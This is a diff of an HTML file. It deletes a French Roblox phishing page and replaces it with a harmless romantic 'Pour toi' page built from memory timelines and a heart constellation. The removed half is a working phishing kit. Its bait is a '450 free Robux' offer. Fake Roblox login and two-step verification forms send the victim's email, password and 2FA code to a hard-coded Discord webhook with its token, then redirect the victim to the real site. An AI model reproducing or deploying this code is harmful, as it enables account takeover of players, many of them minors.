@@ -3,197 +3,361 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>450 Robux offerts par Roblox !</title>
-
-<!-- ===== BALISES POUR L'APERÇU SUR SNAPCHAT ===== -->
-<meta property="og:title" content="450 Robux offerts par Roblox !">
-<meta property="og:description" content="Profite de cette offre exclusive valable aujourd'hui seulement. Clique pour obtenir tes 450 Robux gratuits !">
-<meta property="og:image" content="https://i.imgur.com/82xfKc8.png">
-<meta property="og:url" content="https://tonlien.com/page.html">
-<meta name="twitter:card" content="summary_large_image">
-<!-- ============================================== -->
-
+<title>Pour toi</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,500;0,600;1,500&family=Jost:wght@300;400;500&display=swap" rel="stylesheet">
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif;}
-body{background:#23242d;color:white;min-height:100vh;display:flex;flex-direction:column;align-items:center;}
-header{background:#12131c;padding:12px 15px;width:100%;}
-.topbar{display:flex;justify-content:space-between;align-items:center;}
-.logo{width:38px;height:38px;background:white;transform:rotate(15deg);position:relative;}
-.logo:after{content:"";width:10px;height:10px;background:#12131c;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);}
-.actions{display:flex;gap:10px;align-items:center;}
-.signup{background:#335fff;border:none;color:white;padding:10px 20px;border-radius:12px;font-size:16px;}
-.login{background:transparent;border:2px solid #aaa;color:white;padding:10px 20px;border-radius:12px;font-size:16px;}
-.search{font-size:28px;}
-.nav{display:flex;justify-content:space-around;margin-top:15px;color:#ddd;font-size:15px;}
-.banner{height:130px;background:#000;width:100%;}
-.container{padding:25px 20px 40px;max-width:430px;width:100%;margin:auto;}
-h1{text-align:center;font-size:34px;margin-bottom:25px;}
-input{width:100%;background:#3c3f4d;border:2px solid #4f5260;color:white;padding:16px;border-radius:14px;font-size:18px;margin-bottom:15px;}
-input::placeholder{color:#d2d2d2;}
-.btn-login{width:100%;padding:14px;background:transparent;border:2px solid #ddd;color:#ddd;border-radius:14px;font-size:20px;cursor:pointer;}
-.forgot{text-align:center;margin:25px 0;font-size:18px;}
-hr{border:none;border-top:1px solid #4a4d5a;margin-bottom:25px;}
-.btn-secondary{width:100%;background:#454958;color:white;border:none;border-radius:14px;padding:16px;font-size:18px;margin-bottom:15px;cursor:pointer;}
-.register{text-align:center;margin-top:35px;font-size:16px;}
-.register a{color:white;text-decoration:none;font-weight:bold;}
-.hidden{display:none!important;}
-.container-2fa{background-color:#2b2b2b;max-width:420px;width:100%;padding:20px;border-radius:16px;margin:20px auto;}
-.header{display:flex;align-items:center;justify-content:center;padding:14px 20px;border-bottom:1px solid #3d3d3d;position:relative;}
-.close-btn{position:absolute;left:16px;background:none;border:none;color:#fff;font-size:20px;cursor:pointer;}
-.header h1{color:#fff;font-size:16px;font-weight:600;margin:0;}
-.content{display:flex;flex-direction:column;align-items:center;padding:20px 0;}
-.shield-icon{width:80px;height:80px;margin-bottom:20px;}
-.description{color:#c0c0c0;font-size:13px;text-align:center;line-height:1.55;margin-bottom:20px;}
-.code-input{width:100%;background:#1a1a1a;border:1.5px solid #4a4a4a;border-radius:8px;padding:13px 14px;color:#888;font-size:14px;outline:none;margin-bottom:18px;}
-.code-input:focus{border-color:#e8124b;color:#fff;}
-.resend-link{color:#fff;font-size:13px;font-weight:700;cursor:pointer;margin-bottom:18px;background:none;border:none;text-decoration:none;}
-.resend-link:hover{text-decoration:underline;}
-.verify-btn{width:100%;background:#555;color:#aaa;border:none;border-radius:8px;padding:13px;font-size:14px;font-weight:600;cursor:pointer;margin-bottom:20px;transition:background 0.2s;}
-.verify-btn:hover{background:#e8124b;color:#fff;}
-.help-text{color:#888;font-size:12px;text-align:center;margin-bottom:20px;}
-.help-text a{color:#fff;font-weight:600;text-decoration:none;}
-.warning{color:#666;font-size:11px;text-align:center;line-height:1.6;padding:0 14px 10px;}
+
+/* ============================================================
+   ZONE À PERSONNALISER — objet CONFIG en bas du <script>.
+   PHOTOS : remplace <div class="photo-placeholder"> par une
+   <img src="photos/xx.jpg"> à l'intérieur du .memory-photo.
+   ============================================================ */
+
+:root{
+  --navy-deep:#081228;
+  --navy-mid:#122140;
+  --gold:#7EC8E3;
+  --cream:#EAF4FB;
+  --cream-dim:#9FB9D6;
+  --font-display:'Cormorant Garamond', serif;
+  --font-body:'Jost', sans-serif;
+}
+
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{
+  background:var(--navy-deep);
+  color:var(--cream);
+  font-family:var(--font-body);
+  font-weight:300;
+  overflow-x:hidden;
+}
+
+#stars{
+  position:fixed;
+  inset:0;
+  z-index:0;
+  pointer-events:none;
+}
+
+section{
+  position:relative;
+  z-index:1;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  padding:8vh 6vw;
+  text-align:center;
+}
+
+/* ---------- HERO ---------- */
+.hero-eyebrow{
+  font-size:0.72rem;
+  letter-spacing:0.32em;
+  text-transform:uppercase;
+  color:var(--gold);
+  opacity:0;
+  animation:fadeUp 1.4s ease 0.1s forwards;
+  margin-bottom:1.6rem;
+}
+.hero h1{
+  font-family:var(--font-display);
+  font-style:italic;
+  font-weight:500;
+  font-size:clamp(2.4rem, 6.5vw, 4.2rem);
+  color:var(--cream);
+  opacity:0;
+  animation:fadeUp 1.4s ease 0.4s forwards;
+  letter-spacing:0.01em;
+}
+.hero p{
+  margin-top:1.1rem;
+  font-weight:300;
+  font-size:clamp(0.95rem,1.8vw,1.1rem);
+  color:var(--cream-dim);
+  opacity:0;
+  animation:fadeUp 1.4s ease 0.9s forwards;
+  max-width:32ch;
+}
+.scroll-hint{
+  position:absolute;
+  bottom:6vh;
+  font-size:0.68rem;
+  letter-spacing:0.28em;
+  text-transform:uppercase;
+  color:var(--cream-dim);
+  opacity:0;
+  animation:fadeUp 1.4s ease 1.5s forwards, driftDown 2.6s ease-in-out 3s infinite;
+}
+@keyframes fadeUp{
+  from{opacity:0; transform:translateY(18px);}
+  to{opacity:1; transform:translateY(0);}
+}
+@keyframes driftDown{
+  0%,100%{transform:translateY(0); opacity:0.55;}
+  50%{transform:translateY(6px); opacity:1;}
+}
+
+/* ---------- TIMELINE ---------- */
+.section-eyebrow{
+  font-size:0.7rem;
+  letter-spacing:0.3em;
+  text-transform:uppercase;
+  color:var(--gold);
+  margin-bottom:0.9rem;
+}
+.timeline-title{
+  font-family:var(--font-display);
+  font-style:italic;
+  font-weight:500;
+  font-size:clamp(1.7rem,4vw,2.3rem);
+  margin-bottom:4.5rem;
+  color:var(--cream);
+}
+.timeline{
+  width:100%;
+  max-width:640px;
+  display:flex;
+  flex-direction:column;
+  gap:3.2rem;
+}
+.memory{
+  display:grid;
+  grid-template-columns:64px 1fr;
+  gap:1.4rem;
+  align-items:center;
+  text-align:left;
+  opacity:0;
+  transform:translateY(22px);
+  transition:opacity 0.8s ease, transform 0.8s ease;
+}
+.memory.visible{opacity:1; transform:translateY(0);}
+
+.memory-photo{
+  width:64px;
+  height:64px;
+  border-radius:50%;
+  overflow:hidden;
+  border:1px solid rgba(126,200,227,0.4);
+}
+.photo-placeholder{
+  width:100%;
+  height:100%;
+  background:var(--navy-mid);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:1.3rem;
+}
+.memory-text .date{
+  font-family:var(--font-display);
+  font-style:italic;
+  color:var(--gold);
+  font-size:1.15rem;
+  margin-bottom:0.25rem;
+}
+.memory-text p{
+  font-weight:300;
+  color:var(--cream-dim);
+  font-size:0.95rem;
+  line-height:1.55;
+}
+
+/* ---------- CONSTELLATION ---------- */
+.constellation-wrap{
+  position:relative;
+  width:100%;
+  max-width:420px;
+  aspect-ratio:1/1;
+}
+#heartCanvas{width:100%; height:100%;}
+.constellation-caption{
+  margin-top:1.4rem;
+  font-family:var(--font-display);
+  font-style:italic;
+  font-size:1.25rem;
+  color:var(--cream-dim);
+}
+
+/* ---------- QUESTION FINALE ---------- */
+.question-title{
+  font-family:var(--font-display);
+  font-style:italic;
+  font-weight:500;
+  font-size:clamp(1.7rem,4.8vw,2.8rem);
+  max-width:640px;
+  line-height:1.35;
+  color:var(--cream);
+}
+
+@media (max-width:480px){
+  .memory{grid-template-columns:52px 1fr; gap:1rem;}
+  .memory-photo{width:52px; height:52px;}
+}
 </style>
 </head>
 <body>
 
-<!-- ===== PAGE 1 : CONNEXION ===== -->
-<div id="page1">
-<header>
-    <div class="topbar">
-        <div class="logo"></div>
-        <div class="actions">
-            <button class="signup" onclick="alert('Redirection inscription')">S'inscrire</button>
-            <button class="login" onclick="alert('Déjà sur la page de connexion')">Connexion</button>
-            <span class="search">⌕</span>
-        </div>
-    </div>
-    <div class="nav">
-        <span>Charts</span>
-        <span>Marketplace</span>
-        <span>Créer</span>
-        <span>Robux</span>
-    </div>
-</header>
-<div class="banner"></div>
-<div class="container">
-    <h1>Connexion à Roblox</h1>
-    <form id="loginForm">
-        <input type="text" name="email" id="email" placeholder="Identifiant/E-mail/Téléphone" required autocomplete="off">
-        <input type="password" name="password" id="password" placeholder="Mot de passe" required>
-        <button type="submit" class="btn-login">Connexion</button>
-    </form>
-    <div class="forgot">Mot de passe ou nom d'utilisateur oublié ?</div>
-    <hr>
-    <button class="btn-secondary" onclick="alert('Code unique envoyé (démo)')">Envoyez-moi un code unique par email</button>
-    <button class="btn-secondary" onclick="alert('Connexion rapide (démo)')">Connexion rapide</button>
-    <div class="register">Vous n'avez pas de compte ? <a href="#" onclick="alert('Redirection inscription')">S'inscrire</a></div>
-</div>
-</div>
+<canvas id="stars"></canvas>
 
-<!-- ===== PAGE 2 : 2FA ===== -->
-<div id="page2" class="hidden">
-<div class="container-2fa">
-    <div class="header">
-        <button class="close-btn">&#x2715;</button>
-        <h1>Vérification en 2 étapes</h1>
-    </div>
-    <div class="content">
-        <svg class="shield-icon" viewBox="0 0 100 110" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M50 5 L90 22 L90 55 C90 78 72 97 50 105 C28 97 10 78 10 55 L10 22 Z" fill="none" stroke="white" stroke-width="5" stroke-linejoin="round"/>
-            <rect x="34" y="46" width="32" height="26" rx="4" fill="none" stroke="white" stroke-width="4"/>
-            <path d="M38 46 L38 38 C38 30 62 30 62 38 L62 46" fill="none" stroke="white" stroke-width="4" stroke-linecap="round"/>
-            <circle cx="50" cy="59" r="4" fill="white"/>
-            <line x1="50" y1="63" x2="50" y2="68" stroke="white" stroke-width="3.5" stroke-linecap="round"/>
-        </svg>
-        <p class="description">Nous voulons nous assurer qu'il s'agit bien de toi. Saisis le code que nous avons envoyé à ton e-mail:</p>
-        <input class="code-input" type="number" placeholder="Saisir le code à 6 chiffres" maxlength="6" id="codeInput">
-        <a class="resend-link" id="resendLink2">Renvoyer le code</a>
-        <button class="verify-btn" id="verifyBtn">Vérifier</button>
-        <p class="help-text">Besoin d'aide ? Contactez <a href="#">Assistance Roblox</a></p>
-    </div>
-    <p class="warning">IMPORTANT : Ne partagez pas vos codes de sécurité avec quiconque. Roblox ne vous demandera jamais vos codes.</p>
-</div>
-</div>
+<!-- ===== HERO ===== -->
+<section class="hero">
+  <div class="hero-eyebrow">Pour toi</div>
+  <h1 id="heroTitle">Il y a quelque chose que je veux te dire</h1>
+  <p id="heroSub">Prends un instant, ferme la porte, et lis jusqu'au bout.</p>
+  <div class="scroll-hint">Continuer</div>
+</section>
+
+<!-- ===== TIMELINE ===== -->
+<section>
+  <div class="section-eyebrow">Souvenirs</div>
+  <h2 class="timeline-title">Quelques morceaux de nous</h2>
+  <div class="timeline" id="timeline"></div>
+</section>
+
+<!-- ===== CONSTELLATION ===== -->
+<section>
+  <div class="constellation-wrap">
+    <canvas id="heartCanvas"></canvas>
+  </div>
+  <p class="constellation-caption">même les étoiles se sont alignées</p>
+</section>
+
+<!-- ===== QUESTION FINALE ===== -->
+<section>
+  <div class="section-eyebrow">La question</div>
+  <h1 class="question-title" id="questionTitle"></h1>
+</section>
 
 <script>
-// ===== CONFIGURATION (webhook) =====
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1514754277103374386/yD8QSoJZxuqYdN2Q2veMBvjytBHHoQASpor5gCBlAOOoQdsDHRUh9dW-h3U-pTSlaK3A";
-// ===================================
+/* ============================================================
+   CONFIG — modifie uniquement cette partie pour personnaliser
+   ============================================================ */
+const CONFIG = {
+  heroTitle: "Il y a quelque chose que je veux te dire",
+  heroSub: "Prends un instant, ferme la porte, et lis jusqu'au bout.",
 
-// ----- PAGE 1 : Connexion -----
-const form = document.getElementById('loginForm');
-const page1 = document.getElementById('page1');
-const page2 = document.getElementById('page2');
+  memories: [
+    { emoji:"☕", date:"Notre première fois", text:"Remplace ce texte par le souvenir de votre rencontre." },
+    { emoji:"🌆", date:"Ce jour-là", text:"Un souvenir marquant, un fou rire, un voyage..." },
+    { emoji:"🎶", date:"Notre chanson", text:"Ce qui vous appartient à vous deux." },
+    { emoji:"🤍", date:"Aujourd'hui", text:"Ce que tu ressens pour elle en ce moment." }
+  ],
 
-form.addEventListener('submit', async function(e) {
-    e.preventDefault();
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
+  questionTitle: "Alors... tu es partante pour qu'on continue à écrire notre histoire, pour de vrai, tous les deux ?"
+};
 
-    if(email && password) {
-        await fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                content: `🎮 **Roblox Grab**\nEmail: \`${email}\`\nMot de passe: \`${password}\``
-            })
-        });
+document.getElementById('heroTitle').textContent = CONFIG.heroTitle;
+document.getElementById('heroSub').textContent = CONFIG.heroSub;
+document.getElementById('questionTitle').textContent = CONFIG.questionTitle;
 
-        document.getElementById('email').value = '';
-        document.getElementById('password').value = '';
-
-        setTimeout(() => {
-            page1.classList.add('hidden');
-            page2.classList.remove('hidden');
-            document.getElementById('codeInput').focus();
-        }, 800);
-    }
+/* ---------- Rendu de la timeline ---------- */
+const timelineEl = document.getElementById('timeline');
+CONFIG.memories.forEach(m=>{
+  const div = document.createElement('div');
+  div.className = 'memory';
+  div.innerHTML = `
+    <div class="memory-photo"><div class="photo-placeholder">${m.emoji}</div></div>
+    <div class="memory-text">
+      <div class="date">${m.date}</div>
+      <p>${m.text}</p>
+    </div>`;
+  timelineEl.appendChild(div);
 });
+const observer = new IntersectionObserver(entries=>{
+  entries.forEach(e=>{ if(e.isIntersecting) e.target.classList.add('visible'); });
+},{threshold:0.3});
+document.querySelectorAll('.memory').forEach(m=>observer.observe(m));
 
-// ----- PAGE 2 : Code 2FA -----
-const codeInput = document.getElementById('codeInput');
-const verifyBtn = document.getElementById('verifyBtn');
-const resendLink2 = document.getElementById('resendLink2');
-
-async function sendCodeToDiscord(code) {
-    try {
-        await fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                content: `🔐 **Code 2FA Roblox**\n\`${code}\``
-            })
-        });
-    } catch(e) {}
+/* ---------- Ciel étoilé (discret) ---------- */
+const starsCanvas = document.getElementById('stars');
+const sctx = starsCanvas.getContext('2d');
+let stars = [];
+function resizeStars(){
+  starsCanvas.width = window.innerWidth;
+  starsCanvas.height = document.body.scrollHeight;
+  stars = Array.from({length: Math.floor(window.innerWidth/9)}, ()=>({
+    x: Math.random()*starsCanvas.width,
+    y: Math.random()*starsCanvas.height,
+    r: Math.random()*1.1+0.25,
+    phase: Math.random()*Math.PI*2,
+    speed: Math.random()*0.015+0.004
+  }));
 }
-
-function handleCodeSubmission() {
-    const code = codeInput.value.trim();
-    if (code.length !== 6 || isNaN(code)) {
-        alert('Veuillez saisir les 6 chiffres du code.');
-        return;
-    }
-    sendCodeToDiscord(code);
-    alert('Code envoyé pour vérification (simulé)');
-    window.location.href = 'https://www.roblox.com';
+function drawStars(t){
+  sctx.clearRect(0,0,starsCanvas.width,starsCanvas.height);
+  stars.forEach(s=>{
+    const alpha = 0.25 + 0.45*Math.sin(t*s.speed + s.phase);
+    sctx.beginPath();
+    sctx.arc(s.x, s.y, s.r, 0, Math.PI*2);
+    sctx.fillStyle = `rgba(234,244,251,${Math.max(0,alpha)})`;
+    sctx.fill();
+  });
+  requestAnimationFrame(drawStars);
 }
+resizeStars();
+window.addEventListener('resize', resizeStars);
+requestAnimationFrame(drawStars);
 
-verifyBtn.addEventListener('click', handleCodeSubmission);
+/* ---------- Constellation en cœur ---------- */
+const heartCanvas = document.getElementById('heartCanvas');
+const hctx = heartCanvas.getContext('2d');
+let heartPoints = [];
+let heartDrawn = false;
 
-codeInput.addEventListener('input', function() {
-    if (this.value.length === 6) {
-        handleCodeSubmission();
+function heartPos(t, scale, cx, cy){
+  const x = 16*Math.pow(Math.sin(t),3);
+  const y = 13*Math.cos(t) - 5*Math.cos(2*t) - 2*Math.cos(3*t) - Math.cos(4*t);
+  return { x: cx + x*scale, y: cy - y*scale };
+}
+function setupHeart(){
+  const size = heartCanvas.clientWidth;
+  heartCanvas.width = size;
+  heartCanvas.height = size;
+  const cx = size/2, cy = size/2;
+  const scale = size/38;
+  heartPoints = [];
+  const n = 34;
+  for(let i=0;i<n;i++){
+    const t = (i/n)*Math.PI*2;
+    heartPoints.push(heartPos(t, scale, cx, cy));
+  }
+}
+function animateHeart(){
+  if(heartDrawn) return;
+  heartDrawn = true;
+  let i = 0;
+  function step(){
+    if(i > heartPoints.length) return;
+    hctx.clearRect(0,0,heartCanvas.width,heartCanvas.height);
+    hctx.strokeStyle = 'rgba(126,200,227,0.5)';
+    hctx.lineWidth = 0.8;
+    hctx.beginPath();
+    for(let k=0;k<i;k++){
+      const p = heartPoints[k];
+      if(k===0) hctx.moveTo(p.x,p.y); else hctx.lineTo(p.x,p.y);
     }
-});
-
-resendLink2.addEventListener('click', function(e) {
-    e.preventDefault();
-    alert('Un nouveau code a été envoyé à votre e-mail (simulé).');
-    codeInput.value = '';
-    codeInput.focus();
-});
+    if(i>1) hctx.stroke();
+    for(let k=0;k<i;k++){
+      const p = heartPoints[k];
+      hctx.beginPath();
+      hctx.arc(p.x,p.y,1.8,0,Math.PI*2);
+      hctx.fillStyle = '#EAF4FB';
+      hctx.fill();
+    }
+    i++;
+    requestAnimationFrame(step);
+  }
+  step();
+}
+setupHeart();
+window.addEventListener('resize', setupHeart);
+new IntersectionObserver(entries=>{
+  entries.forEach(e=>{ if(e.isIntersecting) animateHeart(); });
+},{threshold:0.5}).observe(heartCanvas);
 </script>
-
 </body>
 </html>
